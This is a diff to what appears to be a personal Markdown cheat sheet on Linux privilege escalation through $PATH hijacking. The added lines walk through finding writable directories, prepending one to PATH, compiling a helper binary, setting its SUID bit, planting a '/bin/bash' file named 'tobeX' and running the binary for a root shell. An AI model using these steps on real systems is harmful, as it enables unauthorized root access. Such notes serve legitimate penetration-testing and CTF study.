@@ -62,9 +62,18 @@ getcap -r / 2>/dev/null
 **Using $PATH**
 > list the PATH by ``echo $PATH``
 
-> find for writable path ``find / -writable 2>/dev/null`` or clean -> `` find / -writable 2>/dev/null | cut -d "/" -f2 | sort -u ``
+> find for writable path ``find / -writable 2>/dev/null`` or clean the out put using -> `` find / -writable 2>/dev/null | cut -d "/" -f2 | sort -u ``
 
 > If able to modify the $PATH then ``export PATH=/DIR:$PATH`` (make sure to change the DIR)
 
 now we have the required directory listed in out $PATH then we can just create a Script to exploit it 
-For example 👉🏻 [path.c](path.c)
+
+For example 👉🏻 [path.c](path.c).
+Now compile it using gcc ``gcc path.c -o shell``.
+After compiling set the SUID bit ``chmod u+s shell``
+
+Now, go into the directory whichever you have added to $PATH and create a executable file ``echo "/bin/bash" > tobeX ``
+give it executable rights ``chmod 777 tobeX ``
+
+Final Step ->  Just run script that we have created  ``./shell``. Boom!
+
